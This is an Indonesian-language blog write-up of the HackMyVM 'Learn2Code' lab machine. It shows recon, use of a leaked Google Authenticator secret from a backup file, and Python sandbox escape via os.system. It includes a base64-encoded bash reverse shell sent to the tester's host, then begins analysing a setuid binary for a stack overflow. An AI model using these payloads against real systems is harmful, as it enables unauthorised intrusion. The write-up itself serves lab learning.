@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackMyVM: Learn2Code | sharpicx</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="HackMyVM: Learn2Code" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Mesin dengan tingkat kesulitan Medium dan semua kasus yang berbau basic untuk pengenalan exploit development dan seterusnya. Tingkat privilege escalation yang tidak begitu sulit karena tinggal analisis dan extract string saja. Well, lumayan membuang-buang waktu juga sih karena saya tidak terbiasa dengan pwn hehe, karena soal ini saya mempelajari banyak hal dan menyukai exploit development!. Mari simak!" />
+<meta property="og:description" content="Mesin dengan tingkat kesulitan Medium dan semua kasus yang berbau basic untuk pengenalan exploit development dan seterusnya. Tingkat privilege escalation yang tidak begitu sulit karena tinggal analisis dan extract string saja. Well, lumayan membuang-buang waktu juga sih karena saya tidak terbiasa dengan pwn hehe, karena soal ini saya mempelajari banyak hal dan menyukai exploit development!. Mari simak!" />
+<link rel="canonical" href="http://localhost:4000/hmv-learn2code" />
+<meta property="og:url" content="http://localhost:4000/hmv-learn2code" />
+<meta property="og:site_name" content="sharpicx" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-15T00:00:00+07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackMyVM: Learn2Code" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-15T00:00:00+07:00","datePublished":"2022-10-15T00:00:00+07:00","description":"Mesin dengan tingkat kesulitan Medium dan semua kasus yang berbau basic untuk pengenalan exploit development dan seterusnya. Tingkat privilege escalation yang tidak begitu sulit karena tinggal analisis dan extract string saja. Well, lumayan membuang-buang waktu juga sih karena saya tidak terbiasa dengan pwn hehe, karena soal ini saya mempelajari banyak hal dan menyukai exploit development!. Mari simak!","headline":"HackMyVM: Learn2Code","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hmv-learn2code"},"url":"http://localhost:4000/hmv-learn2code"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<meta name="keywords" content="php-code-authentication,bypass-python-sandbox,RCE,stack-based overflow,reversing" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" href="/favicon.ico"/>
+<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
+<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
+<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
+<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+
+<!--[if lt IE 9]>
+  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+
+
+<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>
+
+
+<script src="/assets/script/jekyllpaper.js" async ></script>
+<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>
+
+
+</head>
+<body>
+  <div class="container-wrapper">
+    <header class="container-header">
+      <div class="header-info">
+  <span class="header-info-name">sharpicx</span><br/>
+  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
+</div>
+<nav class="header-nav">
+  <ul class="header-main-nav">
+  
+    <li class="header-main-nav-item"><a href="/">home</a></li>
+  
+    <li class="header-main-nav-item"><a href="/category">categories</a></li>
+  
+    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
+  
+  </ul>
+</nav>
+
+    </header>
+    <main class="container-main">
+      <article class="container-post">
+  <div class="post-title" style="padding: 0px 0px 20px 0px">
+    <h1>HackMyVM: Learn2Code</h1>
+  </div>
+  <div class="post-author">
+    <span>sharpicx</span>
+  </div>
+  <div class="post-content">
+    <p>Mesin dengan tingkat kesulitan <strong>Medium</strong> dan semua kasus yang berbau basic untuk pengenalan exploit development dan seterusnya. Tingkat privilege escalation yang tidak begitu sulit karena tinggal analisis dan extract string saja. Well, lumayan membuang-buang waktu juga sih karena saya tidak terbiasa dengan <em>pwn</em> hehe, karena soal ini saya mempelajari banyak hal dan menyukai exploit development!. Mari simak!</p>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>Saved as variable.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>victim=192.168.56.27
+</code></pre></div></div>
+
+<h2 id="nmap-scanning">Nmap Scanning</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.92 scan initiated Sat Oct  8 13:38:51 2022 as: nmap -vvv -p 80 -sCV -A -oN scan_tcp 192.168.56.27</span>
+Nmap scan report <span class="k">for </span>192.168.56.27
+Host is up, received syn-ack <span class="o">(</span>0.00043s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-10-08 13:39:00 WIB <span class="k">for </span>6s
+
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Access system
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sat Oct  8 13:39:06 2022 -- 1 IP address (1 host up) scanned in 14.80 seconds</span>
+
+</code></pre></div></div>
+<p>Port hanya 80 saja? tidak ada yang lain? Apache? Oke.</p>
+
+<h2 id="80---static-web">80 - static web</h2>
+
+<p><img src="https://i.postimg.cc/sfm6d9G9/image.png" alt="image123213" /></p>
+
+<p>Dari sini saya berpikir untuk fuzzing codenya dengan mengirimkan data menggunakan metode POST request lalu menggunakan wordlist 6 digit dari <em>SecLists</em>. Dan saya berpikir akan kena dan langsung login tapi ternyata itu hanya membuang waktu saja.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/learn2code]
+╰─ wfuzz <span class="nt">-w</span> /opt/SecLists/Fuzzing/6-digits-000000-999999.txt <span class="nt">-d</span> <span class="s2">"action=check_code&amp;code=FUZZ"</span> <span class="nt">-u</span> http://<span class="nv">$victim</span>/ <span class="nt">--hl</span> 32
+
+</code></pre></div></div>
+<p><img width="400" src="https://i0.kym-cdn.com/photos/images/facebook/000/029/118/29bc5tl.png" /></p>
+
+<h2 id="whatweb-results">Whatweb results</h2>
+
+<p><img src="https://i.postimg.cc/CM6nD3pB/image.png" alt="image" /></p>
+
+<p>JQuery? menarik.</p>
+
+<h2 id="nikto-results">Nikto results</h2>
+
+<p><img src="https://i.postimg.cc/pdhRw617/image.png" alt="image2" /></p>
+
+<p>ada directory indexing, apache default file. hmm menarik semua.</p>
+
+<p>sebenarnya saya sempat scanning dengan <strong>wapiti</strong> tetapi tidak ada result yang menarik untuk diulas. dan juga saya sempat menjalankan <strong>gobuster</strong> untuk bruteforcing atau fuzzing directory tapi ternyata output yang ditampilkan sama saja seperti <strong>nikto</strong>.</p>
+
+<h2 id="directory-listing">directory listing</h2>
+
+<p>di sini ada 3 folder, tetapi yang membuat saya tertarik itu ada 2 dan yang paling utama ialah folder <em>PHP</em>.</p>
+
+<p><img src="https://i.postimg.cc/gjkZHpNQ/image.png" alt="image3" /></p>
+
+<h2 id="exploiting">exploiting</h2>
+
+<p>karena biasanya di bagian folder PHP ini bisa dapat banyak vulnerability yang bisa diinjeksi (menurut pengalaman) dan ditesting untuk masuk ke revshell ataupun bisa di-abuse seperti mendapatkan cookies untuk login, atau menambahkan RCE, dan semacamnya. Tapi kali ini jalan yang saya tempuh sedikit berbeda.</p>
+
+<p><img src="https://i.postimg.cc/QxC6XZhf/image.png" alt="image4" /></p>
+
+<p>well, <strong>GoogleAuthenticator.php</strong> itu ketika saya cari ternyata filenya ada <em>source code</em> di <a href="https://github.com/PHPGangsta/GoogleAuthenticator/blob/master/PHPGangsta/GoogleAuthenticator.php">github</a>. nanti akan saya tamapakkan beberapa fungsi yang penting untuk dibahas.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [machines/learn2code]
+╰─ cat access.php.bak
+<span class="cp">&lt;?php</span>
+        <span class="k">require_once</span> <span class="s1">'GoogleAuthenticator.php'</span><span class="p">;</span>
+        <span class="nv">$ga</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PHPGangsta_GoogleAuthenticator</span><span class="p">();</span>
+        <span class="nv">$secret</span> <span class="o">=</span> <span class="s2">"S4I22IG3KHZIGQCJ"</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'check_code'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'code'</span><span class="p">];</span>
+                <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$ga</span><span class="o">-&gt;</span><span class="nf">verifyCode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">,</span> <span class="nv">$code</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">include</span><span class="p">(</span><span class="s1">'coder.php'</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                        <span class="k">echo</span> <span class="s2">"wrong"</span><span class="p">;</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+<span class="cp">?&gt;</span>%
+
+</code></pre></div></div>
+<p>Dari sini, sudah mengindikasikan bahwa kita harus mencari <em>parameter</em> untuk variable <em>$code</em> dengan metode POST request sebagai <em>argument included</em>. jadi mau tidak mau harus membuat beberapa modifikasi dari fungsi orisinilnya seperti di bawah ini.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [machines/learn2code]
+╰─ cat testing.php
+<span class="cp">&lt;?php</span>
+  <span class="k">require_once</span> <span class="s1">'GoogleAuthenticator.php'</span><span class="p">;</span>
+  <span class="nv">$ga</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PHPGangsta_GoogleAuthenticator</span><span class="p">();</span>
+
+  <span class="nv">$secret</span> <span class="o">=</span> <span class="s2">"S4I22IG3KHZIGQCJ"</span><span class="p">;</span>
+  <span class="nv">$kodeNyaAnjing</span> <span class="o">=</span> <span class="nv">$ga</span><span class="o">-&gt;</span><span class="nf">getCode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">);</span>
+  <span class="nv">$checkResult</span> <span class="o">=</span> <span class="nv">$ga</span><span class="o">-&gt;</span><span class="nf">verifyCode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">,</span> <span class="nv">$kodeNyaAnjing</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$checkResult</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nv">$kodeNyaAnjing</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="k">echo</span> <span class="s1">'failed'</span><span class="p">;</span> <span class="c1"># code...</span>
+  <span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+<p>lalu saat saya jalankan, dan yap tinggal masukkan saja.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/learn2code]
+╰─ php testing.php
+991873%
+</code></pre></div></div>
+<h2 id="shell-as-www-data">shell as www-data</h2>
+
+<p>Jadi ga tau kenapa saat saya ingin melihat responsive websitenya kembali dan memasukkan <em>generated code</em> tersebut malah ga masuk-masuk, jadi saya menggunakan CLI untuk testing dan nanti saya akan menggunakan cookies sebagai pengganti <em>request data</em> agar tetap saved login.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/learn2code]
+╰─ php testing.php
+772367%
+╭─ via <span class="o">[</span>machines/learn2code]
+╰─ curl <span class="nt">-vX</span> POST <span class="s1">'http://192.168.56.27/includes/php/access.php'</span> <span class="nt">-d</span> <span class="s1">'action=check_code&amp;code=772367'</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 192.168.56.27:80...
+<span class="k">*</span> Connected to 192.168.56.27 <span class="o">(</span>192.168.56.27<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
+<span class="o">&gt;</span> POST /includes/php/access.php HTTP/1.1
+<span class="o">&gt;</span> Host: 192.168.56.27
+<span class="o">&gt;</span> User-Agent: curl/7.85.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> Content-Length: 29
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+<span class="k">*</span> Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sat, 15 Oct 2022 09:20:07 GMT
+&lt; Server: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+&lt; Set-Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>n6jrt811hte6ni7hetvj4vh6kp<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt; Vary: Accept-Encoding
+&lt; Content-Length: 1543
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+&lt;
+                &lt;<span class="o">!</span>DOCTYPE html&gt;
+                &lt;HTML&gt;
+                        &lt;<span class="nb">head</span><span class="o">&gt;</span>
+                                &lt;title&gt;Coding practise&lt;/title&gt;
+
+                                &lt;<span class="o">!</span><span class="nt">--</span> Configurations <span class="nt">--</span><span class="o">&gt;</span>
+                                &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+                                &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=edge"</span><span class="o">&gt;</span>
+                                &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
+
+                                &lt;<span class="o">!</span><span class="nt">--</span> Styles <span class="nt">--</span><span class="o">&gt;</span>
+                                &lt;<span class="nb">link </span><span class="nv">href</span><span class="o">=</span><span class="s2">"../includes/css/style.css"</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span><span class="o">&gt;</span>
+                                &lt;<span class="nb">link </span><span class="nv">href</span><span class="o">=</span><span class="s2">"../includes/css/bootstrap.min.css"</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span><span class="o">&gt;</span>
+
+                                &lt;<span class="o">!</span><span class="nt">--</span> JavaScript <span class="nt">--</span><span class="o">&gt;</span>
+                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"../includes/js/jquery-3.4.1.min.js"</span><span class="o">&gt;</span>&lt;/script&gt;
+                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"../includes/js/bootstrap.min.js"</span><span class="o">&gt;</span>&lt;/script&gt;
+                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"../includes/js/custom_lib.js"</span><span class="o">&gt;</span>&lt;/script&gt;
+                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"../includes/js/functions.js"</span><span class="o">&gt;</span>&lt;/script&gt;
+                        &lt;/head&gt;
+                        &lt;body&gt;
+                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
+                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row d-flex justify-content-center h-100"</span><span class="o">&gt;</span>
+                                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-md-6 boxWrap"</span><span class="o">&gt;</span>
+                                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
+                                                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row"</span><span class="o">&gt;</span>
+                                                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-12"</span><span class="o">&gt;</span>
+                                                                                &lt;label <span class="k">for</span><span class="o">=</span><span class="s2">"custom_code"</span><span class="o">&gt;</span>Type your code:&lt;/label&gt;
+                                                                                &lt;textarea <span class="nv">class</span><span class="o">=</span><span class="s2">"form-control custom-code"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"custom_code"</span> <span class="nv">rows</span><span class="o">=</span><span class="s2">"10"</span><span class="o">&gt;</span>&lt;/textarea&gt;
+                                                                        &lt;/div&gt;
+                                                                &lt;/div&gt;
+                                                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row"</span><span class="o">&gt;</span>
+                                                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-12"</span><span class="o">&gt;</span>
+                                                                                &lt;button <span class="nb">type</span><span class="o">=</span><span class="s2">"button"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"btn btn-primary btn-block"</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">"run_code();"</span><span class="o">&gt;</span>Run code&lt;/button&gt;
+                                                                        &lt;/div&gt;
+                                                                &lt;/div&gt;
+                                                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row"</span><span class="o">&gt;</span>
+                                                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-12"</span><span class="o">&gt;</span>
+                                                                                &lt;textarea <span class="nv">class</span><span class="o">=</span><span class="s2">"form-control response-code"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"response_code"</span> <span class="nv">rows</span><span class="o">=</span><span class="s2">"10"</span> disabled&gt;&lt;/textarea&gt;
+                                                                        &lt;/div&gt;
+                                                                &lt;/div&gt;
+                                                        &lt;/div&gt;
+                                                &lt;/div&gt;
+                                        &lt;/div&gt;
+                                &lt;/div&gt;
+                        &lt;/body&gt;
+                &lt;/HTML&gt;
+<span class="k">*</span> Connection <span class="c">#0 to host 192.168.56.27 left intact</span>
+     
+</code></pre></div></div>
+<p>saya ulangi lagi dan mencoba untuk memasukkan ini ke dalam request data dengan POST method untuk dikirimkan ke url <strong>/includes/php/access.php</strong>. dan mengambil cookiesnya untuk injeksi <em>python sandboxes</em> yang terdapat pada situs tersebut.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [machines/learn2code]
+╰─ curl -sX POST 'http://192.168.56.27/includes/php/runcode.php' -d "action=run_code&amp;code=__import__('os').system('ls')" -b "PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"
+GoogleAuthenticator.php
+access.php
+access.php.bak
+coder.php
+runcode.php
+╭─ via [machines/learn2code]
+╰─ curl -sX POST 'http://192.168.56.27/includes/php/runcode.php' -d "action=run_code&amp;code=__import__('os').system('id')" -b "PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+</code></pre></div></div>
+<p>seperti biasa kalo sudah seperti ini saya pasti waktunya untuk memasukkan <em>reverse shell</em> !!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/learn2code]
+╰─ <span class="nb">echo</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/12345 0&gt;&amp;1"</span> | <span class="nb">base64</span> | cboard
+╭─ via <span class="o">[</span>machines/learn2code]
+╰─ curl <span class="nt">-sX</span> POST <span class="s1">'http://192.168.56.27/includes/php/runcode.php'</span> <span class="nt">-d</span> <span class="s2">"action=run_code&amp;code=__import__('os').system('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg== | base64 -d | bash')"</span> <span class="nt">-b</span> <span class="s2">"PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"</span>
+
+</code></pre></div></div>
+<p><img src="https://i.postimg.cc/0QqDXQYH/image.png" alt="image7" /></p>
+
+<h2 id="binary-analyzing">binary analyzing</h2>
+
+<p>kalau sudah masuk biasanya saya mencari versi kernel, jaringan network untuk melihat port apa saja yang sedang <em>listened</em> atau <em>open</em>, atau melihat <strong>SUID</strong> binary yang bisa digunakan untuk injeksi dan kebetulan saya tidak kepikiran untuk menyalakan <strong>LinPEAS</strong> karena terlalu fokus dan sangat tertarik.</p>
+
+<p><img src="https://i.postimg.cc/qRd8RL77/image.png" alt="image9" /></p>
+
+<p>terdapat binary <strong>MakeMeLearner</strong> sebagai tersangka pertama. wait-wait-wait ketika saya eksekusi ia membutuh kan argumen, wow. ketika saya test untuk melihat <em>man help</em>-nya ternyata ini termasuk binary ELF.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span>/usr/bin/MakeMeLearner
+/usr/bin/MakeMeLearner
+MakeMeLearner: please specify an argument
+www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span>/usr/bin/MakeMeLearner <span class="nt">-h</span>
+/usr/bin/MakeMeLearner <span class="nt">-h</span>
+Change the <span class="s1">'modified'</span> variable value to <span class="s1">'0x61626364'</span> to be a learnerTry again, you got 0x00000000
+www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span>file /usr/bin/MakeMeLearner
+file /usr/bin/MakeMeLearner
+/usr/bin/MakeMeLearner: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+</code></pre></div></div>
+<p>kalau sudah seperti ini, saya harus memindahkan executable ini ke mesin local saya agar bisa saya debugging dan decompile dan melihat bagaimana executable ini berjalan.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span><span class="nb">cp</span> /usr/bin/MakeMeLearner /dev/shm/.
+&lt;/includes/php<span class="nv">$ </span><span class="nb">cp</span> /usr/bin/MakeMeLearner /dev/shm/.
+www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server <span class="nt">-d</span> /dev/shm/
+&lt;l/includes/php<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server <span class="nt">-d</span> /dev/shm/
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+192.168.56.1 - - <span class="o">[</span>15/Oct/2022 16:45:30] <span class="s2">"GET /MakeMeLearner HTTP/1.1"</span> 200 -
+
+<span class="nt">---local</span> machine---
+
+╭─ via <span class="o">[</span>machines/learn2code]
+╰─ wget http://<span class="nv">$victim</span>:8000/MakeMeLearner
+<span class="nt">--2022-10-15</span> 16:44:02--  http://192.168.56.27:8000/MakeMeLearner
+Connecting to 192.168.56.27:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16864 <span class="o">(</span>16K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘MakeMeLearner’
+
+MakeMeLearner                       100%[<span class="o">=================================================================&gt;]</span>  16.47K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s
+
+2022-10-15 16:44:02 <span class="o">(</span>32.6 MB/s<span class="o">)</span> - ‘MakeMeLearner’ saved <span class="o">[</span>16864/16864]
+</code></pre></div></div>
+
+<p>Yeah, sebelum itu saya lihat dulu kondisi strings dan imported simbols dari libraries yang dipakai pada executable ini.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/learn2code]
+╰─ strings MakeMeLearner
+/lib64/ld-linux-x86-64.so.2
+setuid
+strcpy
+<span class="nb">printf
+</span>system
+__cxa_finalize
+errx
+setgid
+__libc_start_main
+libc.so.6
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+<span class="o">=</span>dcbau<span class="s2">"
+[]A</span><span class="se">\A</span><span class="s2">]A^A_
+please specify an argument
+Change the 'modified' variable value to '0x61626364' to be a learner
+/bin/bash
+Try again, you got 0x%08x
+;*3$"</span>
+GCC: <span class="o">(</span>Debian 9.3.0-15<span class="o">)</span> 9.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7452
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+test.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+strcpy@@GLIBC_2.2.5
+_edata
+errx@@GLIBC_2.2.5
+system@@GLIBC_2.2.5
+<span class="nb">printf</span>@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+
+</code></pre></div></div>
+<p>terdapat string menarik seperti di bawah ini, saya yakin 4 awal kata di bawah adalah sebuah fungsi dan seterusnya itu adalah string yang mungkin sangat berguna untuk ditelisik lagi.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setuid
+strcpy
+printf
+system
+
+=dcbau"
+[]A\A]A^A_
+please specify an argument
+Change the 'modified' variable value to '0x61626364' to be a learner
+/bin/bash
+Try again, you got 0x%08x
+;*3$"
+</code></pre></div></div>
+<p>karena saya adalah manusia modern maka saya ingin kepastian yang lebih akurat lagi, jadi saya menjalankan <code class="language-plaintext highlighter-rouge">rabin2</code> untuk melihat lebih banyak informasi lagi terkait <em>executable</em> ini.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/learn2code]
+╰─ rabin2 <span class="nt">-zi</span> MakeMeLearner
+<span class="o">[</span>Imports]
+nth vaddr      <span class="nb">bind   type   </span>lib name
+―――――――――――――――――――――――――――――――――――――
+1   0x00000000 WEAK   NOTYPE     _ITM_deregisterTMCloneTable
+2   0x00001030 GLOBAL FUNC       strcpy
+3   0x00001040 GLOBAL FUNC       errx
+4   0x00001050 GLOBAL FUNC       system
+5   0x00001060 GLOBAL FUNC       <span class="nb">printf
+</span>6   0x00000000 GLOBAL FUNC       __libc_start_main
+7   0x00000000 WEAK   NOTYPE     __gmon_start__
+8   0x00001070 GLOBAL FUNC       setgid
+9   0x00000000 WEAK   NOTYPE     _ITM_registerTMCloneTable
+10  0x00001080 GLOBAL FUNC       setuid
+11  0x00001090 WEAK   FUNC       __cxa_finalize
+
+<span class="o">[</span>Strings]
+nth paddr      vaddr      len size section <span class="nb">type  </span>string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00002008 0x00002008 27  28   .rodata ascii please specify an argument<span class="se">\n</span>
+1   0x00002028 0x00002028 68  69   .rodata ascii Change the <span class="s1">'modified'</span> variable value to <span class="s1">'0x61626364'</span> to be a learner
+2   0x0000206d 0x0000206d 9   10   .rodata ascii /bin/bash
+3   0x00002077 0x00002077 26  27   .rodata ascii Try again, you got 0x%08x<span class="se">\n</span>
+
+</code></pre></div></div>
+
+<p>dari sini bisa ditarik sebuah kesimpulan bahwa ini semacam <code class="language-plaintext highlighter-rouge">stack-based overflow</code> yang paling dasar karena terdapat keanehan pada address <code class="language-plaintext highlighter-rouge">0x00002028</code> dan <code class="language-plaintext highlighter-rouge">0x00002077</code> yang mana saya melihat dari keduanya terjadi karena suatu <strong>conditional expression</strong>.</p>
+
+<p>-</p>
+
